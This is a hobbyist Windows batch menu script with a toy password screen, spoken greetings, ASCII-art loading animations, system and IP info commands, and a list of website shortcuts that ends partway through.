:::ONLY FOR WINDOWS 11:::

@echo off
:Warning
cls
title Warning
color C
echo [INFO] I am not responsible if your PC is damaged.
echo [INFO] It will come new Updates.
echo [INFO] The Password is Marv492005.
echo [INFO] The Other Password is OtherUser
echo.
echo.
echo 1) Continued
echo 2) Changelog
echo 3) Close
echo.
echo.
echo                                                                                                     [Made By Marv492005]
set /p Warning=choose: 
if %Warning% == 1 goto Userchoose
if %Warning% == 2 goto Changelog
if %Warning% == 3 goto Goodbye
goto Password

:Changelog
cls
title Changelog
echo [+] Added AI Assistent
echo.
echo.
echo 1) close
set /p Changelog=choose: 
if %Changelog% == 1 goto Warning
goto Changelog

:Userchoose
cls
title Choose a User
color F
echo 1) Marv492005
echo 2) Other User [IN WORK]
echo.
echo 3) Back
set /p Userchoose=choose: 
if %Userchoose% == 1 goto Password
if %Userchoose% == 2 goto Password2
if %Userchoose% == 3 goto Goodbye
goto Userchoose

:Password2
cls
title Enter The password here
echo set speechobject=createobject("sapi.spvoice") >%userprofile%\AppData\Local\Temp\welcome.vbs
echo dim speechobject >>%userprofile%\AppData\Local\Temp\welcome.vbs
echo speechobject.speak "Please enter the Password %username%" >>%userprofile%\AppData\Local\Temp\welcome.vbs
timeout 1 >NUL
start %userprofile%\AppData\Local\Temp\welcome.vbs
timeout 1 >NUL
del %userprofile%\AppData\Local\Temp\welcome.vbs
set /p Password2=Passwort: 
if %Password2% == OtherUser goto Intro
echo wrong
pause
goto Password2

:Password
cls
title Enter the password here
color F
echo set speechobject=createobject("sapi.spvoice") >%userprofile%\AppData\Local\Temp\welcome.vbs
echo dim speechobject >>%userprofile%\AppData\Local\Temp\welcome.vbs
echo speechobject.speak "Please enter the Password %username%" >>%userprofile%\AppData\Local\Temp\welcome.vbs
timeout 1 >NUL
start %userprofile%\AppData\Local\Temp\welcome.vbs
timeout 1 >NUL
del %userprofile%\AppData\Local\Temp\welcome.vbs
set /p Password=Passwort: 
if %Password% == Marv492005 goto Intro
echo wrong
pause
goto Password

:Intro
cls
title Loading Screen
echo set speechobject=createobject("sapi.spvoice") >%userprofile%\AppData\Local\Temp\welcome.vbs
echo dim speechobject >>%userprofile%\AppData\Local\Temp\welcome.vbs
echo speechobject.speak "Welcome %username%" >>%userprofile%\AppData\Local\Temp\welcome.vbs
timeout 1 >NUL
start %userprofile%\AppData\Local\Temp\welcome.vbs
timeout 1 >NUL
del %userprofile%\AppData\Local\Temp\welcome.vbs
msg * Welcome %username%
@mode con cols=222 lines=38
color A
echo         :::   :::       :::     :::::::::  :::     :::            :::   :::   :::::::::: ::::    ::: :::    ::: 
timeout 0.3 >NUL
cls

echo         :::   :::       :::     :::::::::  :::     :::            :::   :::   :::::::::: ::::    ::: :::    ::: 
echo       :+:+: :+:+:    :+: :+:   :+:    :+: :+:     :+:           :+:+: :+:+:  :+:        :+:+:   :+: :+:    :+:  
timeout 0.3 >NUL
cls

echo         :::   :::       :::     :::::::::  :::     :::            :::   :::   :::::::::: ::::    ::: :::    ::: 
echo       :+:+: :+:+:    :+: :+:   :+:    :+: :+:     :+:           :+:+: :+:+:  :+:        :+:+:   :+: :+:    :+:  
echo     +:+ +:+:+ +:+  +:+   +:+  +:+    +:+ +:+     +:+          +:+ +:+:+ +:+ +:+        :+:+:+  +:+ +:+    +:+   
timeout 0.3 >NUL
cls

echo         :::   :::       :::     :::::::::  :::     :::            :::   :::   :::::::::: ::::    ::: :::    ::: 
echo       :+:+: :+:+:    :+: :+:   :+:    :+: :+:     :+:           :+:+: :+:+:  :+:        :+:+:   :+: :+:    :+:  
echo     +:+ +:+:+ +:+  +:+   +:+  +:+    +:+ +:+     +:+          +:+ +:+:+ +:+ +:+        :+:+:+  +:+ +:+    +:+   
echo    +#+  +:+  +#+ +#++:++#++: +#++:++#:  +#+     +:+          +#+  +:+  +#+ +#++:++#   +#+ +:+ +#+ +#+    +:+    
timeout 0.3 >NUL
cls

echo         :::   :::       :::     :::::::::  :::     :::            :::   :::   :::::::::: ::::    ::: :::    ::: 
echo       :+:+: :+:+:    :+: :+:   :+:    :+: :+:     :+:           :+:+: :+:+:  :+:        :+:+:   :+: :+:    :+:  
echo     +:+ +:+:+ +:+  +:+   +:+  +:+    +:+ +:+     +:+          +:+ +:+:+ +:+ +:+        :+:+:+  +:+ +:+    +:+   
echo    +#+  +:+  +#+ +#++:++#++: +#++:++#:  +#+     +:+          +#+  +:+  +#+ +#++:++#   +#+ +:+ +#+ +#+    +:+    
echo   +#+       +#+ +#+     +#+ +#+    +#+  +#+   +#+           +#+       +#+ +#+        +#+  +#+#+# +#+    +#+     
timeout 0.3 >NUL
cls

echo         :::   :::       :::     :::::::::  :::     :::            :::   :::   :::::::::: ::::    ::: :::    ::: 
echo       :+:+: :+:+:    :+: :+:   :+:    :+: :+:     :+:           :+:+: :+:+:  :+:        :+:+:   :+: :+:    :+:  
echo     +:+ +:+:+ +:+  +:+   +:+  +:+    +:+ +:+     +:+          +:+ +:+:+ +:+ +:+        :+:+:+  +:+ +:+    +:+   
echo    +#+  +:+  +#+ +#++:++#++: +#++:++#:  +#+     +:+          +#+  +:+  +#+ +#++:++#   +#+ +:+ +#+ +#+    +:+    
echo   +#+       +#+ +#+     +#+ +#+    +#+  +#+   +#+           +#+       +#+ +#+        +#+  +#+#+# +#+    +#+     
echo  #+#       #+# #+#     #+# #+#    #+#   #+#+#+#            #+#       #+# #+#        #+#   #+#+# #+#    #+#      
timeout 0.3 >NUL
cls

echo         :::   :::       :::     :::::::::  :::     :::            :::   :::   :::::::::: ::::    ::: :::    ::: 
echo       :+:+: :+:+:    :+: :+:   :+:    :+: :+:     :+:           :+:+: :+:+:  :+:        :+:+:   :+: :+:    :+:  
echo     +:+ +:+:+ +:+  +:+   +:+  +:+    +:+ +:+     +:+          +:+ +:+:+ +:+ +:+        :+:+:+  +:+ +:+    +:+   
echo    +#+  +:+  +#+ +#++:++#++: +#++:++#:  +#+     +:+          +#+  +:+  +#+ +#++:++#   +#+ +:+ +#+ +#+    +:+    
echo   +#+       +#+ +#+     +#+ +#+    +#+  +#+   +#+           +#+       +#+ +#+        +#+  +#+#+# +#+    +#+     
echo  #+#       #+# #+#     #+# #+#    #+#   #+#+#+#            #+#       #+# #+#        #+#   #+#+# #+#    #+#      
echo ###       ### ###     ### ###    ###     ###              ###       ### ########## ###    ####  ########    
timeout 0.3 >NUL
cls

echo         :::   :::       :::     :::::::::  :::     :::            :::   :::   :::::::::: ::::    ::: :::    ::: 
echo       :+:+: :+:+:    :+: :+:   :+:    :+: :+:     :+:           :+:+: :+:+:  :+:        :+:+:   :+: :+:    :+:  
echo     +:+ +:+:+ +:+  +:+   +:+  +:+    +:+ +:+     +:+          +:+ +:+:+ +:+ +:+        :+:+:+  +:+ +:+    +:+   
echo    +#+  +:+  +#+ +#++:++#++: +#++:++#:  +#+     +:+          +#+  +:+  +#+ +#++:++#   +#+ +:+ +#+ +#+    +:+    
echo   +#+       +#+ +#+     +#+ +#+    +#+  +#+   +#+           +#+       +#+ +#+        +#+  +#+#+# +#+    +#+     
echo  #+#       #+# #+#     #+# #+#    #+#   #+#+#+#            #+#       #+# #+#        #+#   #+#+# #+#    #+#      
echo ###       ### ###     ### ###    ###     ###              ###       ### ########## ###    ####  ########    
echo ______________________________________________________________________________________________________________
timeout 0.3 >NUL
cls

echo         :::   :::       :::     :::::::::  :::     :::            :::   :::   :::::::::: ::::    ::: :::    ::: 
echo       :+:+: :+:+:    :+: :+:   :+:    :+: :+:     :+:           :+:+: :+:+:  :+:        :+:+:   :+: :+:    :+:  
echo     +:+ +:+:+ +:+  +:+   +:+  +:+    +:+ +:+     +:+          +:+ +:+:+ +:+ +:+        :+:+:+  +:+ +:+    +:+   
echo    +#+  +:+  +#+ +#++:++#++: +#++:++#:  +#+     +:+          +#+  +:+  +#+ +#++:++#   +#+ +:+ +#+ +#+    +:+    
echo   +#+       +#+ +#+     +#+ +#+    +#+  +#+   +#+           +#+       +#+ +#+        +#+  +#+#+# +#+    +#+     
echo  #+#       #+# #+#     #+# #+#    #+#   #+#+#+#            #+#       #+# #+#        #+#   #+#+# #+#    #+#      
echo ###       ### ###     ### ###    ###     ###              ###       ### ########## ###    ####  ########    
echo ______________________________________________________________________________________________________________
echo ______________________________________________________________________________________________________________
timeout 3 >NUL

:test
cls
msg * Menu was loaded successfully
goto start

:start
cls
@mode con cols=122 lines=30
title Welcome to the Hub %username%
echo 1) To the Main Menu
echo 2) Options
echo 3) Close
echo.
echo.
echo                                                                                                     [Made By Marv492005]
set /p start=choose: 
if %start% == 1 goto MainMenu
if %start% == 2 goto Options
if %start% == 3 goto Goodbye
goto start

:MainMenu
cls
@mode con cols=122 lines=30
title Welcome to the MainMenu %username%
echo 1) System Info
echo 2) IP Info
echo 3) Website
echo 4) Programms
echo 5) Credits
echo 6) TeamSilencium Videos
echo 7) Robux Codes Video
echo 8) Infos
echo 9) Username Info
echo 10) ProgrammingLanguage
echo 11) AI Assistent
echo 12) test
echo 13) Close
echo.
echo.
echo                                                                                                     [Made By Marv492005]
set /p MainMenu=choose: 
if %MainMenu% == 1 goto PCInfo
if %MainMenu% == 2 goto IP Info
if %MainMenu% == 3 goto Website
if %MainMenu% == 4 goto Programms
if %MainMenu% == 5 goto Credits
if %MainMenu% == 6 goto Videos
if %MainMenu% == 7 goto RobuxCodes
if %MainMenu% == 8 goto Info
if %MainMenu% == 9 goto Password3
if %MainMenu% == 10 goto ProgrammingLanguage
if %MainMenu% == 11 goto AIassistent
if %MainMenu% == 12 goto test
if %MainMenu% == 13 goto start
goto MainMenu

:Options
cls
title Welcome to the Options %username%
@mode con cols=122 lines=30
echo 1) Change ^Color
echo 2) Toogle Text to Speak [in Work]
echo 3) Change Loading Screen
echo 4) Close
echo.
echo.
echo                                                                                                     [Made By Marv492005]
set /p Options=choose: 
if %Options% == 1 goto Colors
if %Options% == 2 goto ToogleTexttoSpeak
if %Options% == 3 goto ChangeLoadScreen
if %Options% == 4 goto start
goto Options

:Colors
cls
title Welcome to the ^Color Change Menu
echo 1) Black
echo 2) Blue
echo 3) Green
echo 4) Cyan
echo 5) Red
echo 6) Purple
echo 7) Yellow
echo 8) Light Gray
echo 9) Gray
echo 10) Light Blue
echo 11) Close
echo.
echo.
echo                                                                                                     [Made By Marv492005]
set /p Colors=choose: 
if %Colors% == 1 color 0
if %Colors% == 2 color 1
if %Colors% == 3 color 2
if %Colors% == 4 color 3
if %Colors% == 5 color 4
if %Colors% == 6 color 5
if %Colors% == 7 color 6
if %Colors% == 8 color 7
if %Colors% == 9 color 8
if %Colors% == 10 color 9
if %Colors% == 11 goto Options
goto Colors

:ToogleTexttoSpeak
cls
title Welcome to Toogle Text to Speak %username%
echo 1) Text to Speak [ON]
echo 2) Text to Speak [OFF]
echo 3) Close
echo.
echo.
set /p ToogleTexttoSpeak=choose: 
if %ToogleTexttoSpeak% == [ON] toogle Text to Speak [ON]
if %ToogleTexttoSpeak% == [OFF] toogle Text to Speak [OFF]
if %ToogleTexttoSpeak% == 3 goto Options
goto ToogleTexttoSpeak

:ChangeLoadScreen
cls
title Welcome to the Change Loading Screen Option %username%
@mode con cols=122 lines=30
echo 1) Loading Screen 1
echo 2) Loading Screen 2
echo 3) Loading Screen 3
echo 4) Loading Screen 4
echo 5) Loading Screen 5
echo 6) Loading Screen 6
echo 7) Close
echo.
echo.
echo                                                                                                     [Made By Marv492005]
set /p ChangeLoadScreen=choose: 
if %ChangeLoadScreen% == 1 goto LoadingScreen1
if %ChangeLoadScreen% == 2 goto LoadingScreen2
if %ChangeLoadScreen% == 3 goto LoadingScreen3
if %ChangeLoadScreen% == 4 goto LoadingScreen4
if %ChangeLoadScreen% == 5 goto LoadingScreen5
if %ChangeLoadScreen% == 6 goto LoadingScreen6
if %ChangeLoadScreen% == 7 goto Options
goto ChangeLoadScreen

:LoadingScreen1
cls
title Welcome to the Standart Loading Screen %username%
@mode con cols=75 lines=1000
color A
echo MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
echo MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
echo MMMMMMMMMMMMMMMMMMNmdyso+//:--..````````.--://+syhmNMMMMMMMMMMMMMMMMMM
echo MMMMMMMMMMMMNds/-`                                  `-/ohNMMMMMMMMMMMM
echo MMMMMMMMMNs:                                              .omMMMMMMMMM
echo MMMMMMMMy`                                                   +NMMMMMMM
timeout 1 >NUL
echo MMMMMMMo                                                      -MMMMMMM
echo MMMMMMh                                                        +MMMMMM
echo MMMMMM-                                                        `mMMMMM
echo MMMMMh                                                          +MMMMM
echo MMMMM/      ./shdmmdhyo+-`                   -+shmNNNmdy+.      .MMMMM
echo MMMMN`    /hhyosyhhdNMMMMNh/`             :yNMMMMNdhhhsoyhd+     dMMMM
timeout 1 >NUL
echo MMMMd   .s/    :shmNddhhNMMMNo`         +mMMMMdhhdNmds:    /s-   yMMMM
echo MMMMs   .          `:yMNysmMMMh        yMMMmyymMh/`          .   oMMMM
echo MMMM+                 `oNMhshd+        /dyohMNs.                 +MMMM
echo MMMM:                   `/mMd:          .hMm+`                   :MMMM
echo MMMM.         `.-::-.`    `dMMo        .Nm/     `.::::-`         -MMMM
echo MMMM.     `+hNMMMMMMMNds:  `dMM/       ./    :smMMMMMMMMNh+`     .MMMM
timeout 1 >NUL
echo MMMM`  `-+NMMMMMMMMMMMMMMNy.yMMd          .yNMMMMMMMMMMMMMMN+-`  `MMMM
echo MMMM`  /MMMMMMMMMMMMMMMMNmy.hMMN`         `smNmmmmmmddddddhhssys++MMMM
echo MMMM`  +hso/::---..```      dMMN.                                `MMMM
echo MMMM`                       dMMN.                                `MMMM
echo MMMMy                      .NMMN`                                .MMMM
echo MMMMMo                     +MMMN`                                /MMMM
timeout 1 >NUL
echo MMMMMMs                    dMMMN`                               -mMMMM
echo MMMMN/md-                `sMMMMm                              .sMMMMMM
echo MMMMM+`dMdo-.....-::/:`/dMMMMMMd        `yy/               `/hhoMMMMMM
echo MMMMMN-.NMhNMMooo+/:.`.NMMh:NMM+           os   .ossssyhdmmMMm`hMMMMMM
echo MMMMMMm`-Nm:NMh`       yMd .NMM.            /         +MMh.NN--MMMMMMM
echo MMMMMMMh .my-mMNo`      -- .NMm`                    `yMMs +M: dMMMMMMM
timeout 1 >NUL
echo MMMMMMMMy``hh-mMMNy+.       .MN.     `/:          .oNMM+ +N/ oMMMMMMMM
echo MMMMMMMMMy  om+oNMMMMNhs/:/omMMMmhyydNMMh:    .:odMMMN:.hN: +MMMMMMMMM
echo MMMMMMMMMMh` :Nd//yNMMMMMMMMMMMMMs/hMMMMMMNmNMMMMMMm+.oNm- +MMMMMMMMMM
echo MMMMMMMMMMMd` .dMd:`-+ymMMMMMMMd-   -dMMMMMMMMMNho- -yMh` oMMMMMMMMMMM
echo MMMMMMMMMMMMm. `yMMm/`   .:/++o++oooooddhyso/:.     -mo `yMMMMMMMMMMMM
echo MMMMMMMMMMMMMN:  oMMMNo-                           :m: .dMMMMMMMMMMMMM
timeout 1 >NUL
echo MMMMMMMMMMMMMMM+  +MMM:-::/:-.``                  +h` :NMMMMMMMMMMMMMM
echo MMMMMMMMMMMMMMMMs` /MM-     .:omNNNNNNy`        `s+  oMMMMMMMMMMMMMMMM
echo MMMMMMMMMMMMMMMMMd. /M-        -MMMMMd.        .y- `hMMMMMMMMMMMMMMMMM
echo MMMMMMMMMMMMMMMMMMN: +h        -MMMMM+         /` -mMMMMMMMMMMMMMMMMMM
echo MMMMMMMMMMMMMMMMMMMMs`.       .mMMMMMd`          +MMMMMMMMMMMMMMMMMMMM
echo MMMMMMMMMMMMMMMMMMMMMN:       oMMMmmMM/        `hMMMMMMMMMMMMMMMMMMMMM
timeout 1 >NUL
echo MMMMMMMMMMMMMMMMMMMMMMMs`     /MMMMMMM:       :NMMMMMMMMMMMMMMMMMMMMMM
echo MMMMMMMMMMMMMMMMMMMMMMMMd.    `NMMMMMN`     `yMMMMMMMMMMMMMMMMMMMMMMMM
echo MMMMMMMMMMMMMMMMMMMMMMMMMNo`   oMMMMMo    .sNMMMMMMMMMMMMMMMMMMMMMMMMM
echo MMMMMMMMMMMMMMMMMMMMMMMMMMMNs:.-MMMMM` -+hMMMMMMMMMMMMMMMMMMMMMMMMMMMM
echo MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM   
timeout 2 >NUL
echo.
echo.
echo                                                                                                     [Made By Marv492005]
echo 1) Close
set /p LoadingScreen1=choose: 
if %LoadingScreen1% == 1 goto ChangeLoadScreen
goto LoadingScreen1

:LoadingScreen2
cls
title Welcome to the Loading Screen 1 %username%
echo Warten .
timeout 1 >NUL
cls
echo Warten ..
timeout 1 >NUL
cls
echo Warten ...
timeout 1 >NUL
echo                                                                                                     [Made By Marv492005]
echo 1) close
set /p LoadingScreen2=choose: 
if %LoadingScreen2% == 1 goto ChangeLoadScreen
goto LoadingScreen2

:LoadingScreen3
cls
title Welcome to the Loading Screen 2 %username%
@echo off
echo -
PING 1.1.1.1 -n 1 -w 1 >NUL
cls
echo --
PING 1.1.1.1 -n 1 -w 1 >NUL
cls
echo    --
PING 1.1.1.1 -n 1 -w 1 >NUL
cls
echo     -
PING 1.1.1.1 -n 1 -w 1 >NUL
cls
echo       ^|
PING 1.1.1.1 -n 1 -w 1 >NUL
cls
echo.
echo       ^|
PING 1.1.1.1 -n 1 -w 1 >NUL
cls
echo.
echo.
echo       ^|
PING 1.1.1.1 -n 1 -w 1 >NUL
cls
echo.
echo.
echo.
echo       -
PING 1.1.1.1 -n 1 -w 1 >NUL
cls
echo.
echo.
echo.
echo      --
PING 1.1.1.1 -n 1 -w 1 >NUL
cls
echo.
echo.
echo.
echo   --
PING 1.1.1.1 -n 1 -w 1 >NUL
cls
echo.
echo.
echo.
echo -
PING 1.1.1.1 -n 1 -w 1 >NUL
cls
echo.
echo.
echo ^|
PING 1.1.1.1 -n 1 -w 1 >NUL
cls
echo.
echo ^|
PING 1.1.1.1 -n 1 -w 1 >NUL
echo                                                                                                     [Made By Marv492005]
echo 1) close
set /p LoadingScreen3=choose: 
if %LoadingScreen3% == 1 goto ChangeLoadScreen
goto LoadingScreen3

:LoadingScreen4
cls
title Welcome to the Loading Screen 3 %username%
echo  ----------------
echo ^|                ^|
echo  ----------------

timeout 1 >NUL
cls
echo  ----------------
echo ^|-               ^|
echo  ----------------

timeout 1 >NUL
cls
echo  ----------------
echo ^|--              ^|
echo  ----------------

timeout 1 >NUL
cls
echo  ----------------
echo ^|---             ^|
echo  ----------------

timeout 1 >NUL
cls
echo  ----------------
echo ^| ---            ^|
echo  ----------------

timeout 1 >NUL
cls
echo  ----------------
echo ^|  ---           ^|
echo  ----------------

timeout 1 >NUL
cls
echo  ----------------
echo ^|   ---          ^|
echo  ----------------

timeout 1 >NUL
cls
echo  ----------------
echo ^|-   ---         ^|
echo  ----------------

timeout 1 >NUL
cls
echo  ----------------
echo ^|--   ---        ^|
echo  ----------------

timeout 1 >NUL
cls
echo  ----------------
echo ^|---   ---       ^|
echo  ----------------

timeout 1 >NUL
cls
echo  ----------------
echo ^| ---   ---      ^|
echo  ----------------

timeout 1 >NUL
cls
echo  ----------------
echo ^|  ---   ---     ^|
echo  ----------------

timeout 1 >NUL
cls
echo  ----------------
echo ^|   ---   ---    ^|
echo  ----------------

timeout 1 >NUL
cls
echo  ----------------
echo ^|-   ---   ---   ^|
echo  ----------------

timeout 1 >NUL
cls
echo  ----------------
echo ^|--   ---   ---  ^|
echo  ----------------

timeout 1 >NUL
cls
echo  ----------------
echo ^|---   ---   --- ^|
echo  ----------------

timeout 1 >NUL
cls
echo  ----------------
echo ^| ---   ---   ---^|
echo  ----------------

timeout 1 >NUL
cls
echo  ----------------
echo ^|  ---   ---   --^|
echo  ----------------

timeout 1 >NUL
cls
echo  ----------------
echo ^|   ---   ---   -^|
echo  ----------------

timeout 1 >NUL
cls
echo  ----------------
echo ^|    ---   ---   ^|
echo  ----------------

timeout 1 >NUL
cls
echo  ----------------
echo ^|     ---   ---  ^|
echo  ----------------

timeout 1 >NUL
cls
echo  ----------------
echo ^|      ---   --- ^|
echo  ----------------

timeout 1 >NUL
cls
echo  ----------------
echo ^|       ---   ---^|
echo  ----------------

timeout 1 >NUL
cls
echo  ----------------
echo ^|        ---   --^|
echo  ----------------

timeout 1 >NUL
cls
echo  ----------------
echo ^|         ---   -^|
echo  ----------------

timeout 1 >NUL
cls
echo  ----------------
echo ^|          ---   ^|
echo  ----------------

timeout 1 >NUL
cls
echo  ----------------
echo ^|           ---  ^|
echo  ----------------

timeout 1 >NUL
cls
echo  ----------------
echo ^|            --- ^|
echo  ----------------

timeout 1 >NUL
cls
echo  ----------------
echo ^|             ---^|
echo  ----------------

timeout 1 >NUL
cls
echo  ----------------
echo ^|              --^|
echo  ----------------

timeout 1 >NUL
cls
echo  ----------------
echo ^|               -^|
echo  ----------------

timeout 1 >NUL
cls
echo  ----------------
echo ^|                ^|
echo  ----------------

timeout 1 >NUL
cls
echo  ----------------
echo ^|    Finished    ^|
echo  ----------------
echo.
echo.
echo                                                                                                     [Made By Marv492005]
echo 1) close
set /p LoadingScreen4=choose: 
if %LoadingScreen4% == 1 goto ChangeLoadScreen
goto LoadingScreen4

:LoadingScreen5
cls
title Welcome to the Loading Screen 4 %username%
echo =                    ^| 1  %%%
timeout 1 >NUL
cls

echo =====                ^| 20 %%%
timeout 1 >NUL
cls
echo =============        ^| 55 %%%
timeout 1 >NUL
cls
echo ===============      ^| 80 %%%
timeout 1 >NUL
cls
echo ==================== ^| 99 %%%
echo.
echo.
echo                                                                                                     [Made By Marv492005]
echo 1) close
set /p LoadingScreen5=choose: 
if %LoadingScreen5% == 1 goto ChangeLoadScreen
goto LoadingScreen5

:LoadingScreen6
cls
@mode con cols=222 lines=38
echo MMMMMMMM               MMMMMMMM                                                            '::::'                      MMMMMMMM               MMMMMMMM                                                        
echo M:::::::M             M:::::::M                                                            '::::'                      M:::::::M             M:::::::M                                                        
echo M::::::::M           M::::::::M                                                            ':::''                      M::::::::M           M::::::::M                                                        
echo M:::::::::M         M:::::::::M                                                           ':::'                        M:::::::::M         M:::::::::M                                                        
echo M::::::::::M       M::::::::::M  aaaaaaaaaaaaa  rrrrr   rrrrrrrrrvvvvvvv           vvvvvvv''''       ssssssssss        M::::::::::M       M::::::::::M    eeeeeeeeeeee    nnnn  nnnnnnnn    uuuuuu    uuuuuu  
echo M:::::::::::M     M:::::::::::M  a::::::::::::a r::::rrr:::::::::rv:::::v         v:::::v          ss::::::::::s       M:::::::::::M     M:::::::::::M  ee::::::::::::ee  n:::nn::::::::nn  u::::u    u::::u  
echo M:::::::M::::M   M::::M:::::::M  aaaaaaaaa:::::ar:::::::::::::::::rv:::::v       v:::::v         ss:::::::::::::s      M:::::::M::::M   M::::M:::::::M e::::::eeeee:::::een::::::::::::::nn u::::u    u::::u  
echo M::::::M M::::M M::::M M::::::M           a::::arr::::::rrrrr::::::rv:::::v     v:::::v          s::::::ssss:::::s     M::::::M M::::M M::::M M::::::Me::::::e     e:::::enn:::::::::::::::nu::::u    u::::u  
echo M::::::M  M::::M::::M  M::::::M    aaaaaaa:::::a r:::::r     r:::::r v:::::v   v:::::v            s:::::s  ssssss      M::::::M  M::::M::::M  M::::::Me:::::::eeeee::::::e  n:::::nnnn:::::nu::::u    u::::u  
echo M::::::M   M:::::::M   M::::::M  aa::::::::::::a r:::::r     rrrrrrr  v:::::v v:::::v               s::::::s           M::::::M   M:::::::M   M::::::Me:::::::::::::::::e   n::::n    n::::nu::::u    u::::u  
echo M::::::M    M:::::M    M::::::M a::::aaaa::::::a r:::::r               v:::::v:::::v                   s::::::s        M::::::M    M:::::M    M::::::Me::::::eeeeeeeeeee    n::::n    n::::nu::::u    u::::u  
echo M::::::M     MMMMM     M::::::Ma::::a    a:::::a r:::::r                v:::::::::v              ssssss   s:::::s      M::::::M     MMMMM     M::::::Me:::::::e             n::::n    n::::nu:::::uuuu:::::u  
echo M::::::M               M::::::Ma::::a    a:::::a r:::::r                 v:::::::v               s:::::ssss::::::s     M::::::M               M::::::Me::::::::e            n::::n    n::::nu:::::::::::::::uu
echo M::::::M               M::::::Ma:::::aaaa::::::a r:::::r                  v:::::v                s::::::::::::::s      M::::::M               M::::::M e::::::::eeeeeeee    n::::n    n::::n u:::::::::::::::u
echo M::::::M               M::::::M a::::::::::aa:::ar:::::r                   v:::v                  s:::::::::::ss       M::::::M               M::::::M  ee:::::::::::::e    n::::n    n::::n  uu::::::::uu:::u
echo MMMMMMMM               MMMMMMMM  aaaaaaaaaa  aaaarrrrrrr                    vvv                    sssssssssss         MMMMMMMM               MMMMMMMM    eeeeeeeeeeeeee    nnnnnn    nnnnnn    uuuuuuuu  uuuu
echo.
timeout 5 >NUL
echo                                                                                                     [Made By Marv492005]
echo 1) close
set /p LoadingScreen6=choose: 
if %LoadingScreen6% == 1 goto ChangeLoadScreen
goto LoadingScreen6



:PCInfo
cls
title Welcome to your System Info %username%
systeminfo
echo 1) Close
echo.
echo.
echo                                                                                                     [Made By Marv492005]
set /p PCInfo=choose: 
if %PCInfo% == 1 goto MainMenu
goto PCInfo

:IP Info
cls
title Welcome to your IP Info
ipconfig
echo.
echo 1) Close
echo.
echo.
echo                                                                                                     [Made By Marv492005]
set /p IP=choose: 
if %IP% == 1 goto MainMenu
goto IP Info

:Website
cls
title Welcome to the Website Menu
@mode con cols=125 lines=9001
echo 1) Twitch
echo 2) Roblox
echo 3) Instagram
echo 4) Twitter
echo 5) Pastebin
echo 6) Whatsapp Web
echo 7) TikTok
echo 8) Github
echo 9) Youtube
echo 10) Gmail
echo 11) GMX
echo 12) Epicgames
echo 13) Ubisoft
echo 14) Steam
echo 15) Discord
echo 16) Developer Forum
echo 17) Discord Bot List
echo 18) Roblox Deveoper Forum
echo 19) YT Channel TeamSilencium
echo 20) TeamSilencium Roblox Group
echo 21) My Pastebin Account
echo 22) Web.De
echo 23) Google Docs
echo 24) Minecraft
echo 25) Rockstar Games
echo 26) Wasteland.zz
echo 27) BASE64
echo 28) BAT Creator Roblox Profile
echo 29) Ebay
echo 30) Amazon
echo 31) Brave
echo 32) Snapchat Log-in
echo 33) Micresoft
echo 34) My Github Account
echo 35) Baum's Github Account
echo 36) Replit
echo 37) Reddit
echo 38) Marv's Menu Discord Server
echo 39) TeamSilencium Discord Server
echo 40) AnyDesk
echo 41) photopea
echo 42) Trash Gang
echo 43) Trash Gang Discord
echo 44) Onion Browser
echo 45) Mircosoft Store
echo 46) Close
echo.
echo.
echo                                                                                                     [Made By Marv492005]
set /p Website=choose: 
if %Website% == 1 Start https://twitch.com/
if %Website% == 2 Start https://www.roblox.com/home
if %Website% == 3 Start https://www.instagram.com/
if %Website% == 4 Start https://twitter.com/?lang=de
if %Website% == 5 Start https://pastebin.com/
if %Website% == 6 Start https://web.whatsapp.com/
if %Website% == 7 Start https://www.tiktok.com/de-DE
if %Website% == 8 Start https://github.com/
if %Website% == 9 Start https://www.youtube.com/
if %Website% == 10 Start https://mail.google.com/mail/u/0/#inbox
if %Website% == 11 Start https://www.gmx.net/
if %Website% == 12 Start https://www.epicgames.com/site/de/home
if %Website% == 13 Start https://www.ubisoft.com/de-de/
if %Website% == 14 Start https://store.steampowered.com/?l=german
if %Website% == 15 Start https://discord.com/
if %Website% == 16 Start https://discord.com/developers/docs/intro
if %Website% == 17 Start https://top.gg/
if %Website% == 18 Start https://devforum.roblox.com/
if %Website% == 19 Start https://www.youtube.com/channel/UCN5NRQAZs-nLpYLTAYxUukw
if %Website% == 20 Start https://www.roblox.com/groups/11507841/Silencium-studios#!/about
if %Website% == 21 Start https://pastebin.com/u/Marv492005
if %Website% == 22 start https://web.de/?origin=lpc
if %Website% == 23 start https://www.google.de/intl/de/forms/about/
if %Website% == 24 start https://www.minecraft.net/de-de
if %Website% == 25 start https://www.rockstargames.com/de/
if %Website% == 26 start https://wasteland.rfc822.org/cgi-bin/inbox?inbox=Kali
if %Website% == 27 start https://www.base64encode.org/
if %Website% == 28 start https://www.roblox.com/users/513465884/profile
if %Website% == 29 start https://www.ebay.de/
if %Website% == 30 start https://www.amazon.de/?&tag=hydraamazon09-21&ref=pd_sl_781ozcfkw7_e&adgrpid=71137539015&hvpone=&hvptwo=&hvadid=391572096639&hvpos=&hvnetw=g&hvrand=13940885671462430284&hvqmt=e&hvdev=c&hvdvcmdl=&hvlocint=&hvlocphy=9042924&hvtargid=kwd-10573980&hydadcr=12763_1991086
if %Website% == 31 start https://brave.com/de/download/
if %Website% == 32 start https://accounts.snapchat.com/accounts/login?continue=https%3A%2F%2Faccounts.snapchat.com%2Faccounts%2Fwelcome
if %Website% == 33 start https://www.microsoft.com/de-de?&ef_id=Cj0KCQjw5JSLBhCxARIsAHgO2SfTDLNbwtKfXMafPKO0mbPT5ZUd1f4gyv6IRrMeQuOnD72Wwx1W8_UaAq9YEALw_wcB:G:s&s_kwcid=AL!4249!3!507886424089!e!!g!!microsoft&ef_id=Cj0KCQjw5JSLBhCxARIsAHgO2SfTDLNbwtKfXMafPKO0mbPT5ZUd1f4gyv6IRrMeQuOnD72Wwx1W8_UaAq9YEALw_wcB:G:s&OCID=AID2200063_SEM_Cj0KCQjw5JSLBhCxARIsAHgO2SfTDLNbwtKfXMafPKO0mbPT5ZUd1f4gyv6IRrMeQuOnD72Wwx1W8_UaAq9YEALw_wcB:G:s
if %Website% == 34 start https://github.com/ANGECRACKT
if %Website% == 35 start https://github.com/baum1810
if %Website% == 36 start https://replit.com/~
